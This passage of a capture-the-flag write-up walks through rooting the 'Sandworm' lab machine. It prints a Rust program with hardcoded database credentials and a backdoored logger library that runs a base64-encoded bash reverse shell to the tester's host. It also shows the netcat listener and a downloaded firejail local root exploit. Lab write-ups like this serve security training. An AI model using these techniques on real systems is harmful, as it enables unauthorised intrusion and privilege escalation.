    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/11/04 15:19:20 CMD: UID=1001  PID=1616464 | ./pspy32 
2023/11/04 15:19:20 CMD: UID=1001  PID=1616386 | -bash 
.
.
SNIP
.
. 
2023/11/04 15:20:01 CMD: UID=0     PID=1616531 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/11/04 15:20:01 CMD: UID=0     PID=1616529 | /usr/sbin/CRON -f -P 
.
.
SNIP
.
.
2023/11/04 15:22:02 CMD: UID=0     PID=1616576 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/11/04 15:22:02 CMD: UID=1000  PID=1616581 | /usr/bin/cargo run --offline 
```

- We examined the `Rust` program, `main.rs`, in the `/opt/tipnet/src` directory to understand its purpose.

```rust
silentobserver@sandworm:/opt/tipnet/src$ cat main.rs 
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("                                                     
             ,,                                      
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm    
P'   MM   `7               MMN.    M           MM    
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm  
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM    
     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 
                  MM                                 
                .JMML.                               

");


    let mode = get_mode();
    
    if mode == "" {
            return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();


    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username 
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

        let valid = false;
        let mut mode = String::new();

        while ! valid {
                mode.clear();

                println!("Select mode of usage:");
                print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

                io::stdin().read_line(&mut mode).unwrap();

                match mode.trim() {
                        "a" => {
                              println!("\n[+] Upstream selected");
                              return "upstream".to_string();
                        }
                        "b" => {
                              println!("\n[+] Muscular selected");
                              return "regular".to_string();
                        }
                        "c" => {
                              println!("\n[+] Tempora selected");
                              return "emperor".to_string();
                        }
                        "d" => {
                                println!("\n[+] PRISM selected");
                                return "square".to_string();
                        }
                        "e" => {
                                println!("\n[!] Refreshing indeces!");
                                return "pull".to_string();
                        }
                        "q" | "Q" => {
                                println!("\n[-] Quitting");
                                return "".to_string();
                        }
                        _ => {
                                println!("\n[!] Invalid mode: {}", mode);
                        }
                }
        }
        return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}

silentobserver@sandworm:/opt/tipnet/src$ ls -al /opt/crates/logger/
total 40
drwxr-xr-x 5 atlas silentobserver  4096 May  4  2023 .
drwxr-xr-x 3 root  atlas           4096 May  4  2023 ..
-rw-r--r-- 1 atlas silentobserver 11644 May  4  2023 Cargo.lock
-rw-r--r-- 1 atlas silentobserver   190 May  4  2023 Cargo.toml
drwxrwxr-x 6 atlas silentobserver  4096 May  4  2023 .git
-rw-rw-r-- 1 atlas silentobserver    20 May  4  2023 .gitignore
drwxrwxr-x 2 atlas silentobserver  4096 May  4  2023 src
drwxrwxr-x 3 atlas silentobserver  4096 May  4  2023 target
silentobserver@sandworm:/opt/tipnet/src$ 
```

- We noticed that this program relied on an external library called `logger`, and we realized that our user, `silentobserver`, had the permission to modify files in the `src` directory of this library.

- To make our escape, we created a malicious `lib.rs` file. This file included instructions to execute a reverse shell command when the `logger::log` function was used.

```shell
┌──(kali㉿kali)-[~]
└─$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.75/445 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NS80NDUgMD4mMSIK

┌──(kali㉿kali)-[~]
└─$ nc -nlvp 445
listening on [any] 445 ...
```

```rust
silentobserver@sandworm:/tmp/curiosity-hackthebox$ cat lib.rs 
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let status = Command::new("sh")
        .arg("-c")
        .arg("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NS80NDUgMD4mMSIK | base64 -d | bash")
        .status()
        .expect("Failed to execute command");

    if status.success() {
        println!("Command executed successfully");
    } else {
        eprintln!("Command failed with exit code: {:?}", status);
    }

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
silentobserver@sandworm:/tmp/curiosity-hackthebox$ 
silentobserver@sandworm:/tmp/curiosity-hackthebox$ cp /tmp/curiosity-hackthebox/lib.rs /opt/crates/logger/src/lib.rs
```

- We then replaced the original `lib.rs` in the `logger` library with our malicious version.

```shell
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 445
listening on [any] 445 ...
connect to [10.10.14.75] from (UNKNOWN) [10.10.11.218] 34782
bash: cannot set terminal process group (1616804): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$ 
```

- After a short period, we successfully established a reverse shell connection.

```shell
atlas@sandworm:/opt/tipnet$ cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash
```

Now, we had the ability to employ the `grep` command, which was previously inaccessible to us. This served as confirmation that we had effectively escaped the sandboxed environment.

In essence, we broke free from the restricted environment by exploiting the compromised `logger` library to execute commands with elevated privileges.

# PRIVILEGE ESCALATION TO ROOT

```shell
atlas@sandworm:~$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)  
atlas@sandworm:~$ ls -al /usr/local/bin/firejail 
-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 /usr/local/bin/firejail
```

We observed that the user `atlas` belonged to the `jailer` group and had execution permission for the `firejail` binary.

```shell
atlas@sandworm:~$ firejail --version
firejail version 0.9.68

Compile time support:
        - always force nonewprivs support is disabled
        - AppArmor support is disabled
        - AppImage support is enabled
        - chroot support is enabled
        - D-BUS proxy support is enabled
        - file transfer support is enabled
        - firetunnel support is enabled
        - networking support is enabled
        - output logging is enabled
        - overlayfs support is disabled
        - private-home support is enabled
        - private-cache and tmpfs as user enabled
        - SELinux support is disabled
        - user namespace support is enabled
        - X11 sandboxing support is enabled
```

Upon running `firejail --version`, we identified that the version of `firejail` in use was `0.9.68`. While researching, we discovered a [blog post](https://www.openwall.com/lists/oss-security/2022/06/08/10?source=post_page-----55cdb93e53c8--------------------------------) discussing a `local root exploit` vulnerability in `firejail`. The blog post also included a publicly available exploit.

```shell
atlas@sandworm:/tmp$ wget 'http://10.10.14.75/firejail_exploit.py'
--2023-11-04 16:03:25--  http://10.10.14.75/firejail_exploit.py
Connecting to 10.10.14.75:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8649 (8.4K) [text/x-python]
Saving to: ‘firejail_exploit.py’

firejail_exploit.py                             100%[====================================================================================================>]   8.45K  --.-KB/s    in 0.001s  

2023-11-04 16:03:25 (6.09 MB/s) - ‘firejail_exploit.py’ saved [8649/8649]
```

We proceeded to download the exploit onto the target machine using the `wget`.

```shell
atlas@sandworm:/tmp$ python3 firejail_exploit.py 
atlas@sandworm:/tmp$ python3 firejail_exploit.py 
You can now run 'firejail --join=1808438' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

After transferring the exploit, we executed it with `python3`.

```shell
atlas@sandworm:/opt/tipnet$ firejail --join=1808438
changing root to /proc/1808438/root
Warning: cleaning all supplementary groups
Child process initialized in 6.12 ms
atlas@sandworm:/opt/tipnet$ su - root
root@sandworm:~# 
root@sandworm:~# id; whoami
uid=0(root) gid=0(root) groups=0(root)
root
root@sandworm:~# 
```

The exploit provided instructions to run the above commands in another terminal.

In this way, we successfully escalated our privileges to root.

# CONCLUSION

In conclusion, our journey began with the exploitation of a **Server-Side Template Injection** (`SSTI`) vulnerability in a `PGP` signed message, which we cleverly turned into **Remote Code Execution** (`RCE`).

Subsequently, we encountered the confinements of a `firejail` sandboxed environment, requiring us to navigate carefully within these constraints.

We then leveraged hardcoded credentials to transition to another user and craftily manipulated a `Rust` library to break free from the sandboxed environment, expanding our possibilities.

Ultimately, we utilized a local root exploit within `firejail` to achieve the pinnacle of privilege escalation, gaining `root` access.

This marks the conclusion of our adventure on this box. Thank you for accompanying us thus far, and we look forward to sharing more exploits in the next one. Until next time!